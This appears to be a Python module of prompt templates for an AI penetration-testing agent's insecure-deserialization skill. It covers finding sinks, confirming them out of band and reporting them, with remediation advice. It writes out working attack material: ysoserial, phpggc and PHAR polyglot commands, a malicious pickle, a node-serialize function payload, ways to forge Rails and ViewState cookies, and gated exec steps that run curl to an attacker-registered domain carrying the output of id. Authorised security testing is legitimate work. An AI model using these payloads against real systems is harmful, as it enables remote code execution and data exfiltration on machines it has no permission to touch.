"""Built-in insecure-deserialization skill.

Self-contained: every payload, command and gadget the agent needs is inlined
here, grounded in the tools that actually ship in the kali-sandbox image
(ysoserial, phpggc + php-cli, interactsh-client, python3, nodejs). There is NO
reference to any external document, because community skills are only loaded for
a user_skill:* run and are NOT in context during a built-in deserialization run.

DESERIALIZATION_TOOLS is .format()-templated: the ONLY real placeholders are
{deser_exec_gadgets_enabled} and {deser_oob_provider}; every other brace is a
literal and is escaped {{ }}. DESERIALIZATION_OOB_WORKFLOW and
DESERIALIZATION_PAYLOAD_REFERENCE are appended RAW (no .format). The literal
string "interactsh-client" appears ONLY in the OOB workflow, so disabling the OOB
callback removes it from the prompt. Black-box only. No em dashes.
"""

# =============================================================================
# DESERIALIZATION MAIN WORKFLOW (.format()-templated; uses {{ }} for literal braces)
# =============================================================================
DESERIALIZATION_TOOLS = """
## ATTACK SKILL: INSECURE DESERIALIZATION

An insecure-deserialization sink flows attacker-controlled bytes into a
language-level deserializer that reconstructs an object graph (Java
ObjectInputStream, PHP unserialize, Python pickle, Node node-serialize, and
polymorphic JSON/XML/YAML). You have two jobs, and you do whichever the state in
front of you calls for:

- CONFIRM: take the candidates recon already flagged and prove the sink really
  deserializes attacker bytes.
- FIND: when recon flagged nothing (the scan never ran, or it ran and the sink
  was off-HTTP, encrypted or request-body-only), discover sinks yourself and
  prove them.

Rules that never change:
- Confirmation is a NON-DESTRUCTIVE out-of-band oracle. You prove the bytes reach
  a deserializer with a callback that runs no gadget and changes nothing. The
  report is built on this, never on a code-execution chain.
- A code-execution gadget runs ONLY when the operator enabled it (Step 7). When
  it is off you stop at the oracle.
- Black-box: never assume target internals. Fingerprint, do not guess.

### Sandbox reality (what you can and cannot finish here)
Build your plan around the tools that exist in this environment:
- Java: `ysoserial` (full gadget set incl. URLDNS) is installed. End to end.
- PHP: `phpggc` and `php` (php-cli) are installed. End to end, including PHAR.
- Python: `python3` is installed; craft pickle oracles directly. End to end.
- Node: `node`/`npm` are installed; craft node-serialize oracles directly.
- Ruby: `ruby` is installed. Forge a Marshal gadget directly (the universal Ruby
  deserialization gadget is pure-Ruby, no gem needed); this also covers Rails
  `secret_key_base` session cookies. End to end.
- .NET ViewState: `viewgen` is installed, so a signed/encrypted `__VIEWSTATE` is
  end to end WHEN you have the machineKey (leaked / default / from a `web.config`).
  A non-ViewState BinaryFormatter blob is still DETECTION-only (no ysoserial.net),
  and a ViewState whose machineKey you do NOT have is a cryptographic problem (see
  Dead ends), not a deserializer you can reach.
- JNDI (SnakeYAML/Jackson/FastJSON typed payloads): you can make the target FETCH
  a URL you control and confirm that over OAST, but there is no rogue LDAP/RMI
  server in this sandbox, so JNDI-to-RCE is out of reach. Confirmation stops at
  the fetch.
There is no classpath-enumeration tool (no GadgetProbe) here, so select a Java
chain from the framework fingerprint (recon tech, Server/X-Powered-By headers,
cookie names like JSESSIONID / rememberMe) plus URLDNS confirmation, then try the
likely chains and read the response.

================================================================================
## PART A - CONFIRM recon candidates (do this first when the scan ran)
================================================================================

### A1 - Pull pending candidates (query_graph, deterministic read)
The serialized_scan recon module writes :Vulnerability candidates with
source="serialized_scan", needs_agent_confirmation=true and severity="info".
Recon flags presence and reachability only: it is passive and never
deserializes, so each candidate is an UNPROVEN lead (that is why it sits at
severity "info" needing confirmation) until you prove the sink actually parses
your bytes. Proving it is your whole job here.
Capture each candidate's id AND all of its deser_* metadata, including
deser_encoding_layers (the exact decode stack recon peeled off: you MUST re-apply
it in reverse to your oracle) and evidence_snippet (the bytes recon saw).
query_graph imposes no server-side LIMIT, so order and page it; never issue a
bare unordered read.
```
query_graph({{"query": "MATCH (v:Vulnerability {{source:'serialized_scan'}}) WHERE v.needs_agent_confirmation = true AND NOT (:ChainFinding)-[:CONFIRMS]->(v) OPTIONAL MATCH (e:Endpoint)-[:HAS_VULNERABILITY]->(v) RETURN v.id AS id, v.deser_format AS fmt, v.deser_language AS lang, v.deser_transport AS transport, v.deser_location AS location, v.deser_magic AS magic, v.deser_encoding_layers AS layers, v.evidence_snippet AS snippet, v.matched_at AS url, e.method AS method, v.deser_jev_format AS jev_fmt, v.deser_jev_exploitability AS jev_reach ORDER BY CASE v.deser_jev_format WHEN 'none' THEN -1 ELSE coalesce(v.deser_jev_exploitability, -1) END DESC, v.id LIMIT 200"}})
```
Page with an added `SKIP 200` (then 400, ...) when a count shows more than 200. Use
graph_summary to tell "unscanned" (no candidates because the scan never ran, go
to PART B) from "clean" (it ran and found nothing, PART B widens the search).

Work the list in the order it comes back. When the project ranks candidates with
TypeSafe Jev, jev_reach (0-100) is Jev's estimate that the blob reaches a
deserializer from attacker input, and the most reachable come first. jev_fmt is
Jev's own reading of the format, made without seeing fmt: when the two disagree,
or jev_fmt is "none", let evidence_snippet and the captured request decide which
format to build the oracle for. Both are null when the scan did not ask Jev; the
order is then by id.

Note on the locators: the HTTP method is NOT a property of the candidate node; it
lives on the linked Endpoint, which is why the query reads `e.method`. If a
candidate is attached only to a BaseURL, method comes back null, so recover it
from the captured request in A2.

### A2 - Recover the exact original request (traffic tools, do not re-crawl)
For a candidate, pull the real request with your traffic tools: search captured
transactions by the candidate's `url` + `method`, or fetch_transaction when a
transaction id is known. Read off three things you must reproduce exactly:
- deser_transport + deser_location: WHERE the blob rides (a named cookie, a named
  parameter, a named header, or a position in the request body).
- layers (deser_encoding_layers): the encode stack, e.g. ["url","base64","gzip"].
  Your oracle bytes must be wrapped in the SAME layers, innermost-first, or the
  sink never sees a valid object and you get a false negative.
- the surrounding request (other params, auth cookies, CSRF token) so your
  modified request is otherwise valid.

================================================================================
## PART B - FIND new sinks (no candidates, or to go wider than recon)
================================================================================

### B1 - Sweep every input that could carry a serialized blob
Recon sees the response side and enumerated params; request bodies and many
cookies it never had. Walk EVERY attacker-controlled input and look for a blob:
session and auth cookies, hidden form fields, `__VIEWSTATE` / `__EVENTVALIDATION`,
custom headers, query and POST parameters, path segments, JSON/XML request
bodies, file-upload contents and filenames, message-queue or websocket frames,
and any "state"/"token"/"data"/"payload" field. Pull real requests with your
traffic tools rather than re-crawling.

### B2 - Recognise the format
Decode layered values (URL -> base64 -> gzip/zlib -> hex, re-checking at each
layer) and match the magic bytes and text markers in the PAYLOAD REFERENCE below.
That tells you the language and serializer, which decides the oracle.

### B3 - Prove you control it, and read the error channel
Tamper the blob minimally and resend:
- Flip one byte / truncate the trailing bytes. A deserializer that is actually
  parsing your bytes answers differently from one that ignores them: a 500, a
  stack trace naming readObject / unserialize() / pickle / ObjectInputStream, a
  distinct error string, a hang, or a changed response. That differential is
  error-based detection and is itself strong evidence the sink deserializes
  untrusted input. A blob that can be corrupted with no change at all is probably
  not deserialized server-side; deprioritise it.

================================================================================
## CONFIRM THE SINK - three channels, in this order
================================================================================
1. OUT-OF-BAND ORACLE (primary, when the OOB callback is enabled): a payload that
   forces a DNS/HTTP callback to a domain you registered. A hit is proof. This is
   the only channel that confirms blind sinks positively.
2. TIMING (fallback when egress is filtered): point the oracle at an unroutable or
   firewalled host and compare response time against a fast/local target. A
   consistent hang on the external target, fast on the local one, indicates the
   server tried to connect while deserializing.
3. ERROR / EXCEPTION (fallback, always available): the B3 differential. A
   deserialization-specific exception on malformed bytes confirms the parser runs
   on your input even when no callback and no timing signal is available.

If no callback arrives AND there is no timing or error differential, the result
is INCONCLUSIVE (egress may be filtered), NOT "safe". Say inconclusive; never
report a negative as a clean bill.

### Build the oracle per language (re-wrap in the candidate's encoding layers)
Register your OOB domain first (see the OOB oracle section) and call it
REGISTERED_DOMAIN below. The OOB provider for this project is
{deser_oob_provider}. After you generate raw oracle bytes, re-apply the
candidate's `layers` in reverse (e.g. gzip, then base64, then URL-encode) before
placing them in the exact transport/location from A2 or B1.

- JAVA (native_java, and the transport behind Shiro rememberMe / JSF ViewState):
  URLDNS is classpath-independent, so it confirms ObjectInputStream reachability
  even when you do not yet know the gadget libraries.
  ```
  kali_shell({{"command": "ysoserial URLDNS http://REGISTERED_DOMAIN > /tmp/o.bin && base64 -w0 /tmp/o.bin"}})
  ```
  Deliver the base64 (re-wrapped per `layers`) in the cookie/param/body. A DNS hit
  confirms. Only after that, and only if Step 7 is enabled, move to an exec chain.

- JAVA polymorphic JSON/XML/YAML (jackson_json @class, fastjson @type, xstream,
  xmldecoder, snakeyaml): these are TEXT. Hand-craft a typed payload whose type
  forces the parser to open a URL to REGISTERED_DOMAIN (e.g. a data-source / URL /
  JdbcRowSet style type for Jackson/FastJSON, a ScriptEngine URLClassLoader tag
  for SnakeYAML, a java.net.URL element for XMLDecoder/XStream). A fetch to your
  domain confirms the sink instantiates attacker-named types. JNDI-to-RCE needs an
  LDAP/RMI server not present here, so stop at the confirmed fetch.

- PYTHON (python_pickle, yaml.unsafe_load): craft a pickle whose __reduce__ asks
  the interpreter to RESOLVE your domain (DNS only, non-destructive), then base64
  it.
  ```
  kali_shell({{"command": "python3 -c \\"import pickle,base64,socket\\nclass P:\\n def __reduce__(self):\\n  return (socket.gethostbyname,('REGISTERED_DOMAIN',))\\nprint(base64.b64encode(pickle.dumps(P())).decode())\\""}})
  ```
  For a YAML sink, the text form is `!!python/object/apply:socket.gethostbyname ['REGISTERED_DOMAIN']`.
  A DNS hit confirms. os.system/exec stays for Step 7.

- PHP (php_serialize, phar): first prove object injection with php-cli (serialize a
  small object and confirm a wakeup/destruct side effect or an unserialize error
  differential), then use phpggc for a framework chain.
  ```
  kali_shell({{"command": "phpggc -l | head -40"}})          # list chains available
  kali_shell({{"command": "phpggc Monolog/RCE1 system id"}}) # example chain (Step 7 only)
  ```
  PHAR: `phar://` triggers on ANY filesystem function that reaches your archive
  (file_exists, fopen, getimagesize, is_file), not only on an upload field. Build
  a polyglot and point a filesystem sink at it:
  ```
  kali_shell({{"command": "phpggc -p phar -pj /tmp/poly.jpg -o /tmp/x.phar Monolog/RCE1 system id"}})
  ```
  A pure non-destructive PHP oracle is usually the B3 error differential plus a
  gadget whose benign step performs an outbound fetch; lead with error-based when
  no benign-callback chain fits.

- NODE (node-serialize and similar): the sink evaluates an IIFE tagged
  `_$$ND_FUNC$$_`. A non-destructive oracle only resolves your domain:
  ```
  {{"rce":"_$$ND_FUNC$$_function(){{require('dns').lookup('REGISTERED_DOMAIN',function(){{}});}}()"}}
  ```
  Deliver it in the JSON field the sink unserializes. A DNS hit confirms.

- RUBY (ruby_marshal): `ruby` is installed. Non-destructive confirm: lead with the
  B3 error channel on the `\\x04\\x08` marker. Rails: if you recovered
  `secret_key_base`, forge a session cookie by Marshal-dumping a session Hash and
  HMAC-signing it (works on any Ruby). Exec (gated): build a version-appropriate
  universal Ruby gadget object-graph; do NOT Marshal.dump an ERB object (modern
  Ruby refuses it, "singleton class can't be dumped").
- .NET ViewState (viewstate): decode `__VIEWSTATE` with `viewgen --decode`. If it
  is unprotected, or you have the machineKey (leaked / default / from a leaked
  `web.config`), forge an exec payload with `viewgen --webconfig web.config -c
  <cmd>` (gated). A MAC'd/encrypted ViewState with an UNKNOWN key is a crypto
  pivot (see Dead ends).
- .NET BinaryFormatter (dotnet_binaryformatter, non-ViewState): DETECTION only
  here (no ysoserial.net); report the confirmed sink and name the ceiling.

### Prioritise when there are many candidates
Confirm in this order: (1) blobs on AUTH surfaces (session/rememberMe cookies,
ViewState) - highest impact; (2) native binary formats (Java, pickle, .NET,
Marshal) over text typing - usually a more direct sink; (3) a format whose runtime
you can finish in this sandbox (Java, PHP, Python, Node, Ruby, and .NET ViewState
once you have the machineKey) before one that stays detection-only here
(non-ViewState .NET BinaryFormatter). One oracle delivery at a time; do not fan
out gadget chains under load.

================================================================================
## Step 5 - Record the confirmation (there is NO report tool - emit chain_findings)
================================================================================
Do NOT call a "report_finding" tool or action: none exists, and a phase will
reject it. `chain_findings` is a FIELD of your output_analysis, not a tool, an
action, a todo or a next step. Fill it in the SAME response whose output_analysis
interprets the proof (the OAST poll that shows the hit, or the response that shows
the error/timing differential). Never write "emit chain_findings" as a next step or
a todo: when your output_analysis says the sink is confirmed, that same
output_analysis must carry the entry. The orchestration reads it and writes the
finding; a matching `related_finding_ids` is what MERGEs
(:ChainFinding)-[:CONFIRMS]->(candidate) and promotes it.

Add to output_analysis.chain_findings:
```
"chain_findings": [{{
   "finding_type": "vulnerability_confirmed",   // MUST be this, NOT the default
                                                 // "custom": only a proof-typed
                                                 // finding promotes a candidate to
                                                 // T1; "custom" lands the edge but
                                                 // never promotes.
   "severity": "high",
   "title": "Insecure deserialization confirmed (<format> via <transport>)",
   "evidence": "<OAST hit line timestamped within the same minute as delivery; the REGISTERED_DOMAIN you issued; transport + location; format; encoding layers. For a timing/error confirm, the two compared responses or the deserialization exception.>",
   "related_finding_ids": ["<the EXACT candidate id captured in A1>"],
   "confidence": 90
}}]
```
- PART A (you confirmed a RECON candidate): `related_finding_ids` MUST be the
  exact candidate id captured in A1. A mistyped or cross-tenant id matches
  nothing silently - no CONFIRMS edge, no promotion.
- PART B (you found a NEW sink recon never flagged): there is no candidate id to
  link, so omit `related_finding_ids` (or leave it empty). It is recorded as a
  standalone confirmed finding.

================================================================================
## Step 6 - VERIFY the handshake landed (only when you linked a candidate)
================================================================================
The CONFIRMS writer is tenant-scoped and label-restricted and matches nothing
silently on a wrong, mistyped or cross-tenant id. After recording a PART A
confirmation, re-query the candidate and verify an incoming CONFIRMS edge now
exists:
```
query_graph({{"query": "MATCH (cf:ChainFinding)-[:CONFIRMS]->(v:Vulnerability {{id:'<CANDIDATE_ID>'}}) RETURN cf.finding_type, v.id"}})
```
If it is absent, no earlier output_analysis carried the entry (or its id was
wrong). Put the chain_findings entry, with the exact captured id, in the
output_analysis of THIS response: every output_analysis can carry it, including the
one that interprets this verification query. Do not re-run the verification query
until you have done that. Never assume success.

================================================================================
## Dead ends and pivots (do not loop)
================================================================================
- Encrypted or MAC-protected blob (ViewState with MAC, a Shiro rememberMe cookie
  whose AES key you do not have, any signed/encrypted token): the barrier is
  CRYPTOGRAPHIC, not a deserializer you can reach. Do not brute it here;
  switch_skill to crypto_attack to attack the key/MAC, and come back if it falls.
- Confirmed sink you cannot finish in this sandbox (Ruby, .NET, JNDI-to-RCE):
  report the confirmed deserialization with its ceiling named. A confirmed sink
  is a real finding even without the exec step.
- No signal on any of the three channels: report INCONCLUSIVE with what you tried,
  not a clean result.

### When to transition phases    # action="transition_phase"
Confirm candidates in the informational phase with the OOB oracle. Request a phase
transition only when an exec gadget is enabled AND a sink is confirmed.

================================================================================
## Step 7 - Escalate to an exec gadget (GATED: {deser_exec_gadgets_enabled})
================================================================================
Code-execution gadget delivery runs ONLY when the operator enabled it. When
{deser_exec_gadgets_enabled} is false, stop at the non-destructive oracle and
report the confirmation. When true: confirm authorisation, keep the oracle result
as your proof-of-reachability, then deliver ONE gadget that exfils a minimal
fingerprint (id; hostname) over OAST rather than a shell:
- Java: `ysoserial CommonsCollections6 'curl REGISTERED_DOMAIN/$(id|tr " " _)'`
  (pick the chain matching the fingerprint: CommonsCollections1-7,
  CommonsBeanutils1, Spring1/2, Hibernate1/2, Groovy1, ROME, C3P0).
- PHP: the phpggc chain from above with `curl`/`id` as the command.
- Python: a pickle __reduce__ returning (os.system, ('curl REGISTERED_DOMAIN...',)).
- Node: the `_$$ND_FUNC$$_` IIFE calling child_process.exec of the same curl.
One command, minimal fingerprint, over OAST. No destructive actions.

### Reporting guidelines
For each confirmed sink report: the endpoint/parameter/cookie and the byte-stream
format, the runtime and framework fingerprint, the oracle or gadget used, the OAST
or timing/error proof, the encoding layers you reproduced, and a remediation
pointer (disable polymorphic typing; replace BinaryFormatter / pickle /
unserialize / Marshal.load / node-serialize with format-bound parsers; HMAC and
encrypt any state the client holds; allow-list classes on the deserializer).
"""

# =============================================================================
# OUT-OF-BAND ORACLE SETUP (appended when the OOB callback is enabled)
# The ONLY place the literal "interactsh-client" appears.
# =============================================================================
DESERIALIZATION_OOB_WORKFLOW = """
## Non-destructive out-of-band oracle (setup)

Register a callback domain, then point every language oracle at it. The client
ties the issued domain to itself, so you must READ the domain it prints; a random
subdomain will not route back.

### Step 1: start the listener as a background process
```
kali_shell({"command": "interactsh-client -server oast.fun -json -v > /tmp/oast.log 2>&1 & echo $!"})
```
Pass a different host to `-server` if the project configured another OOB provider
or a self-hosted interactsh.

### Step 2: read the issued domain (this is REGISTERED_DOMAIN)
```
kali_shell({"command": "sleep 5 && grep -m1 -oE '[a-z0-9]+\\\\.oast\\\\.[a-z.]+' /tmp/oast.log"})
```

### Step 3: deliver ONE oracle, then poll for the hit
```
kali_shell({"command": "tail -50 /tmp/oast.log"})
```
A DNS or HTTP line for your issued domain, timestamped within the same minute as
the delivery, is the confirmation that the sink deserialized attacker-controlled
bytes with zero impact on the target. Prefer DNS; it leaks less and traverses
egress filters more often. Against an egress-restricted target no callback
arrives: treat that as INCONCLUSIVE and fall back to the timing and error
channels, not as proof the sink is safe. One oracle delivery per minute is plenty;
do not run gadget chains under load.
"""

# =============================================================================
# PER-LANGUAGE / FORMAT REFERENCE (appended raw; self-contained; NO "interactsh-client")
# =============================================================================
DESERIALIZATION_PAYLOAD_REFERENCE = """
## Format-recognition reference (self-contained)

Decode layered values first (URL, base64, gzip/zlib, hex), re-checking at each
layer, then match:

| Format | Magic / marker (raw, then common base64 head) | Language |
| --- | --- | --- |
| Java ObjectInputStream | `AC ED 00 05`  ->  base64 `rO0AB` | Java |
| Java hex-encoded | `aced0005` | Java |
| Jackson / json-io / Genson | JSON key `@class` | Java |
| FastJSON | JSON key `@type` | Java |
| XMLDecoder | `<java version=`, `<object class=`, `<void` | Java |
| XStream | FQ-class element or `class=` attribute | Java |
| SnakeYAML | `!!` plus a Java package tag | Java |
| Hessian | `Content-Type: application/x-hessian` | Java |
| .NET BinaryFormatter | `00 01 00 00 00 FF FF FF FF`  ->  base64 `AAEAAAD/////` | .NET |
| ASP.NET ViewState | `__VIEWSTATE=` param, base64 body | .NET |
| Python pickle (proto 2+) | `80 02` / `80 04` / `80 05`  ->  base64 `gAJ` / `gASV` | Python |
| PyYAML unsafe | `!!python/object` | Python |
| Ruby Marshal | `04 08` | Ruby |
| Node node-serialize | JSON containing `_$$ND_FUNC$$_` | Node |
| PHP serialize | `O:<n>:"..."` (object), `a:<n>:{` (array) | PHP |
| PHP PHAR | `phar://`, or a file whose tail holds a serialized `__HALT_COMPILER` metadata block | PHP |

## Confirmation-first ladder (what each format can reach in THIS sandbox)

- Java native: ysoserial URLDNS confirms (classpath-independent) -> exec chain
  (CommonsCollections/Spring/Hibernate/Groovy/ROME/C3P0) gated. END TO END.
- Java typed JSON/XML/YAML: hand-crafted type forces an outbound fetch (confirm)
  -> JNDI-to-RCE needs an external LDAP/RMI server NOT present (ceiling at fetch).
- PHP: php-cli object-injection + error differential (confirm) -> phpggc chain and
  PHAR polyglot (gated). END TO END.
- Python pickle / unsafe YAML: __reduce__ DNS resolve (confirm) -> os.system (gated).
  END TO END.
- Node node-serialize: `_$$ND_FUNC$$_` DNS lookup (confirm) -> child_process (gated).
  END TO END.
- Ruby Marshal: forge with `ruby` (universal pure-Ruby gadget); Rails
  secret_key_base cookies included. End to end.
- .NET ViewState: `viewgen` decode + forge once you have the machineKey
  (leaked / default / web.config). End to end with the key; a MAC'd/encrypted
  ViewState with an unknown key is a crypto_attack pivot. Non-ViewState
  BinaryFormatter: detection only (no ysoserial.net).

## Transport notes
- Cookies: whole-value base64 blobs (JSESSIONID variants, `rememberMe` for Shiro,
  ASP.NET auth/state cookies). Re-wrap exactly as the original (often base64 only).
- Params / body: `__VIEWSTATE`, `state=`, `data=`, `token=`, JSON/XML body fields.
- Headers: custom `X-*` serialized state; CRLF-split when reading a raw header line.
- Always reproduce deser_encoding_layers in reverse order on your oracle bytes, or
  the sink rejects them before deserializing and you get a false negative.
"""
